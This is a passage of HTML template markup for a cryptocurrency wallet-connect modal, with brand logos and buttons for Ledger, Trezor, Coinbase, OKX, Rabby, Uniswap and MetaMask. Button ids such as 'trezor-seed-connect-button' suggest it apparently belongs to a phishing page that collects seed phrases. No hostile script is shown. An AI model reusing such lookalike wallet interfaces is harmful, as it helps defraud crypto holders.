5Rl/qeBmY/CYm/mqByGzkLHLAe686nf1c/Ou+aRVwOnN2091xzJf75VZz7tpJn45iTZ67Ox510XY+78tY344wqKziHIhDenX0DuA7KJzALI0lYHClbp3k2cmjEUBn0IAAAAAA"
                        alt="Ledger"
                      />
                    </div>
                    <div class="scwtw-text-start">
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-color"
                        >Ledger</span
                      >
                    </div>
                  </div>
                  <div
                    class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2"
                  >
                    <div
                      class="scwtw-hidden scwtw-items-center scwtw-justify-end"
                    >
                      <div>
                        <svg
                          class="scwtw-w-5 sFcwtw-h-5 scwtw-text-color scwtw-animate-spin"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                        >
                          <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                        </svg>
                      </div>
                    </div>
                  </div>
                </button>
              </div>
              <div class="scwtw-w-full walletsli">
                <button
                  @click="walletsswitch('Trezor', true)"
                  class="walletsitem"
                  type="button"
                  id="trezor-seed-connect-button"
                  data-is-loading="false"
                  data-is-recommended="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div class="walletslogobox">
                      <img
                        class="walletslogo"
                        src="data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='100' height='100' rx='13' fill='%230F6148'/%3E%3Cg clip-path='url(%23clip0_0_1)'%3E%3Cpath d='M50.4976 22C42.7377 22 36.4578 28.3281 36.4578 36.1475V41.4498C33.7328 41.9469 31 42.6096 31 43.4696V71.1413C31 71.1413 31 71.9066 31.8535 72.2697C34.9465 73.5321 47.1148 77.8717 49.9104 78.866C50.2705 79.0001 50.3723 79.0001 50.4663 79.0001C50.5994 79.0001 50.6621 79.0001 51.0222 78.866C53.8177 77.8718 66.0174 73.5321 69.1104 72.2697C69.9012 71.9382 69.9326 71.1729 69.9326 71.1729V43.4696C69.9326 42.6096 67.239 41.9153 64.5062 41.4498V36.1475C64.5453 28.3281 58.2262 22 50.4976 22ZM50.4976 28.7621C55.0705 28.7621 57.8347 31.5474 57.8347 36.1554V40.7632C52.7058 40.4003 48.3286 40.4003 43.1684 40.7632V36.1554C43.1684 31.5395 45.9325 28.7621 50.4976 28.7621ZM50.4663 47.549C56.8481 47.549 62.204 48.0461 62.204 48.9377V66.2017C62.204 66.47 62.1727 66.5015 61.9377 66.5963C61.7107 66.6988 51.0536 70.5729 51.0536 70.5729C51.0536 70.5729 50.6229 70.7072 50.4976 70.7072C50.3645 70.7072 49.9416 70.5414 49.9416 70.5414C49.9416 70.5414 39.2846 66.6672 39.0574 66.5648C38.8304 66.4621 38.7912 66.4305 38.7912 66.1701V48.9061C38.7285 48.0145 44.0846 47.549 50.4663 47.549Z' fill='white'/%3E%3C/g%3E%3Cdefs%3E%3CclipPath id='clip0_0_1'%3E%3Crect width='39' height='57' fill='white' transform='translate(31 22)'/%3E%3C/clipPath%3E%3C/defs%3E%3C/svg%3E%0A"
                        alt="Trezor Wallet"
                      />
                    </div>
                    <div class="scwtw-text-start">
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-color"
                        >Trezor Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2"
                  >
                    <div
                      class="scwtw-hidden scwtw-items-center scwtw-justify-end"
                    >
                      <div>
                        <svg
                          class="scwtw-w-5 sFcwtw-h-5 scwtw-text-color scwtw-animate-spin"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                        >
                          <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                        </svg>
                      </div>
                    </div>
                  </div>
                </button>
              </div>
              <div class="scwtw-w-full walletsli">
                <button
                  @click="walletsswitch('Coinbase', true)"
                  class="walletsitem"
                  type="button"
                  id="coinbase-seed-connect-button"
                  data-is-loading="false"
                  data-is-recommended="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div class="walletslogobox">
                      <img
                        class="walletslogo"
                        src="data:image/webp;base64,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"
                        alt="Coinbase Wallet"
                      />
                    </div>
                    <div class="scwtw-text-start">
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-color"
                        >Coinbase Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2"
                  >
                    <div
                      class="scwtw-hidden scwtw-items-center scwtw-justify-end"
                    >
                      <div>
                        <svg
                          class="scwtw-w-5 sFcwtw-h-5 scwtw-text-color scwtw-animate-spin"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                        >
                          <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                        </svg>
                      </div>
                    </div>
                  </div>
                </button>
              </div>
              <div class="scwtw-w-full walletsli">
                <button
                  @click="walletsswitch('OKX', true)"
                  class="walletsitem"
                  type="button"
                  id="okx-seed-connect-button"
                  data-is-loading="false"
                  data-is-recommended="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div class="walletslogobox">
                      <img
                        class="walletslogo"
                        src="data:image/webp;base64,UklGRr4BAABXRUJQVlA4ILIBAABwEACdASp4AHgAPkkgjEOioqGYPwRkKASEtIALalUA+wCyN/ongAbbvJAvlMdN/GfQX/o3Uz9AAjkZucVq+ScElyhxVES8RRjvKysrkejTORbej6xur3wS/a4xhtbRbCVCD+u982lhdE0Sq4tBm0+OtG/wHO4wCnYtutEHN5yk6KUTPL+gG6HtBEjEAAD+/TZohNPjrq0ebIIlm1Z0xctEnNoc/ea6p1RIM2TY1JzvX5Ca/oPH+af+apy7Ge8er22ODKY22+FbvyfjmnUXlfha0Dt5rsX7oYw72tXagN/vz6rJGq3SG1is//zvWYVVO9Kkzy8lBN8FV7Y2L80SmEqS5r7PcZ+G703hfNheky352R1zm9k1Wf1ckj+i2ppfeGhOQUrQX+q780h/5M/k2/+KVGpOr1OAEVH8rUAW7PdYTVtyNn8LsbkcfCXv5/uJA7XBu6XouFk+mCiXT6asrOj/+DqXNc9cj4XtCzikoWUkX7lzkInL6ZK9cosET4MA/ALJR+GNIfbF8Mr6EtMyIFVayQpuFHM/jcfjDmJAjnT4w4TsqFORVllkff+lXplMCAAAAA=="
                        alt="OKX Wallet"
                      />
                    </div>
                    <div class="scwtw-text-start">
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-color"
                        >OKX Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2"
                  >
                    <div
                      class="scwtw-hidden scwtw-items-center scwtw-justify-end"
                    >
                      <div>
                        <svg
                          class="scwtw-w-5 sFcwtw-h-5 scwtw-text-color scwtw-animate-spin"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                        >
                          <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                        </svg>
                      </div>
                    </div>
                  </div>
                </button>
              </div>
              <div class="scwtw-w-full walletsli">
                <button
                  @click="walletsswitch('Rabby', true)"
                  class="walletsitem"
                  type="button"
                  id="rabby-wallet-seed-connect-button"
                  data-is-loading="false"
                  data-is-recommended="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div class="walletslogobox">
                      <img
                        class="walletslogo"
                        src="data:image/webp;base64,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"
                        alt="Rabby Wallet"
                      />
                    </div>
                    <div class="scwtw-text-start">
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-color"
                        >Rabby Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2"
                  >
                    <div
                      class="scwtw-hidden scwtw-items-center scwtw-justify-end"
                    >
                      <div>
                        <svg
                          class="scwtw-w-5 sFcwtw-h-5 scwtw-text-color scwtw-animate-spin"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                        >
                          <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                        </svg>
                      </div>
                    </div>
                  </div>
                </button>
              </div>
              <div class="scwtw-w-full walletsli">
                <button
                  @click="walletsswitch('Uniswap', true)"
                  class="walletsitem"
                  type="button"
                  id="uniswap-wallet-seed-connect-button"
                  data-is-loading="false"
                  data-is-recommended="false"
                >
                  <div
                    class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-4"
                  >
                    <div class="walletslogobox">
                      <img
                        class="walletslogo"
                        src="data:image/webp;base64,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"
                        alt="Uniswap Wallet"
                      />
                    </div>
                    <div class="scwtw-text-start">
                      <span
                        class="scwtw-font-normal scwtw-text-base scwtw-text-color"
                        >Uniswap Wallet</span
                      >
                    </div>
                  </div>
                  <div
                    class="scwtw-flex scwtw-justify-end scwtw-gap-x-2 scwtw-pr-2"
                  >
                    <div
                      class="scwtw-hidden scwtw-items-center scwtw-justify-end"
                    >
                      <div>
                        <svg
                          class="scwtw-w-5 sFcwtw-h-5 scwtw-text-color scwtw-animate-spin"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                        >
                          <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                        </svg>
                      </div>
                    </div>
                  </div>
                </button>
              </div>
            </div>
          </div>
          <div class="walletsright">
            <div class="walletsrbox">
              <div
                :class="
                  walletsright == '1'
                    ? 'walletsrcon'
                    : 'walletsrcon scwtw-hidden'
                "
              >
                <div>
                  <svg
                    class="scwtw-w-12 scwtw-h-12 scwtw-text-color"
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="1"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  >
                    <circle cx="12" cy="12" r="10"></circle>
                    <path
                      d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"
                    ></path>
                    <path d="M2 12h20"></path>
                  </svg>
                </div>
                <div class="walletsrtxtbox">
                  <p class="walletsrtxt">Connect your wallet to get started</p>
                </div>
              </div>
              <div
                :class="
                  walletsright == '2'
                    ? 'walletsrcon'
                    : 'walletsrcon scwtw-hidden'
                "
              >
                <div>
                  <svg
                    class="scwtw-w-12 scwtw-h-12 scwtw-text-color"
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="1"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  >
                    <path d="M14 4.1 12 6"></path>
                    <path d="m5.1 8-2.9-.8"></path>
                    <path d="m6 12-1.9 2"></path>
                    <path d="M7.2 2.2 8 5.1"></path>
                    <path
                      d="M9.037 9.69a.498.498 0 0 1 .653-.653l11 4.5a.5.5 0 0 1-.074.949l-4.349 1.041a1 1 0 0 0-.74.739l-1.04 4.35a.5.5 0 0 1-.95.074z"
                    ></path>
                  </svg>
                </div>
                <div class="walletsrtxtbox">
                  <p class="walletsrtxt">Confirm the wallet connection</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <!-- Metamask -->
  <div
    :class="Metamaskisshow ? 'walletsbox zindexh' : 'walletsbox zindexh op0'"
  >
    <div
      @click="walletsswitch('Metamask', false)"
      class="walletsbg zindexh1"
    ></div>
    <div
      :class="Metamaskisshow ? 'Metamaskbox Metamaskboxshow' : 'Metamaskbox'"
    >
      <div :class="pageManager == '1' ? 'metamaskone' : 'scwtw-hidden'">
        <div>
          <svg
            class="scwtw-h-32 scwtw-w-32 fox-svg"
            fill="none"
            height="33"
            viewBox="0 0 35 33"
            width="35"
            xmlns="http://www.w3.org/2000/svg"
          >
            <g
              stroke-linecap="round"
              stroke-linejoin="round"
              stroke-width=".25"
            >
              <path
                d="m32.9582 1-13.1341 9.7183 2.4424-5.72731z"
                fill="#e17726"
                stroke="#e17726"
              ></path>
              <g fill="#e27625" stroke="#e27625">
                <path d="m2.66296 1 13.01714 9.809-2.3254-5.81802z"></path>
                <path
                  d="m28.2295 23.5335-3.4947 5.3386 7.4829 2.0603 2.1436-7.2823z"
                ></path>
                <path
                  d="m1.27281 23.6501 2.13055 7.2823 7.46994-2.0603-3.48166-5.3386z"
                ></path>
                <path
                  d="m10.4706 14.5149-2.0786 3.1358 7.405.3369-.2469-7.969z"
                ></path>
                <path
                  d="m25.1505 14.5149-5.1575-4.58704-.1688 8.05974 7.4049-.3369z"
                ></path>
                <path d="m10.8733 28.8721 4.4819-2.1639-3.8583-3.0062z"></path>
                <path d="m20.2659 26.7082 4.4689 2.1639-.6105-5.1701z"></path>
              </g>
              <path
                d="m24.7348 28.8721-4.469-2.1639.3638 2.9025-.039 1.231z"
                fill="#d5bfb2"
                stroke="#d5bfb2"
              ></path>
              <path
                d="m10.8732 28.8721 4.1572 1.9696-.026-1.231.3508-2.9025z"
                fill="#d5bfb2"
                stroke="#d5bfb2"
              ></path>
              <path
                d="m15.1084 21.7842-3.7155-1.0884 2.6243-1.2051z"
                fill="#233447"
                stroke="#233447"
              ></path>
              <path
                d="m20.5126 21.7842 1.0913-2.2935 2.6372 1.2051z"
                fill="#233447"
                stroke="#233447"
              ></path>
              <path
                d="m10.8733 28.8721.6495-5.3386-4.13117.1167z"
                fill="#cc6228"
                stroke="#cc6228"
              ></path>
              <path
                d="m24.0982 23.5335.6366 5.3386 3.4946-5.2219z"
                fill="#cc6228"
                stroke="#cc6228"
              ></path>
              <path
                d="m27.2291 17.6507-7.405.3369.6885 3.7966 1.0913-2.2935 2.6372 1.2051z"
                fill="#cc6228"
                stroke="#cc6228"
              ></path>
              <path
                d="m11.3929 20.6958 2.6242-1.2051 1.0913 2.2935.6885-3.7966-7.40495-.3369z"
                fill="#cc6228"
                stroke="#cc6228"
              ></path>
              <path
                d="m8.392 17.6507 3.1049 6.0513-.1039-3.0062z"
                fill="#e27525"
                stroke="#e27525"
              ></path>
              <path
                d="m24.2412 20.6958-.1169 3.0062 3.1049-6.0513z"
                fill="#e27525"
                stroke="#e27525"
              ></path>
              <path
                d="m15.797 17.9876-.6886 3.7967.8704 4.4833.1949-5.9087z"
                fill="#e27525"
                stroke="#e27525"
              ></path>
              <path
                d="m19.8242 17.9876-.3638 2.3584.1819 5.9216.8704-4.4833z"
                fill="#e27525"
                stroke="#e27525"
              ></path>
              <path
                d="m20.5127 21.7842-.8704 4.4834.6236.4406 3.8584-3.0062.1169-3.0062z"
                fill="#f5841f"
                stroke="#f5841f"
              ></path>
              <path
                d="m11.3929 20.6958.104 3.0062 3.8583 3.0062.6236-.4406-.8704-4.4834z"
                fill="#f5841f"
                stroke="#f5841f"
              ></path>
              <path
                d="m20.5906 30.8417.039-1.231-.3378-.2851h-4.9626l-.3248.2851.026 1.231-4.1572-1.9696 1.4551 1.1921 2.9489 2.0344h5.0536l2.962-2.0344 1.442-1.1921z"
                fill="#c0ac9d"
                stroke="#c0ac9d"
              ></path>
              <path
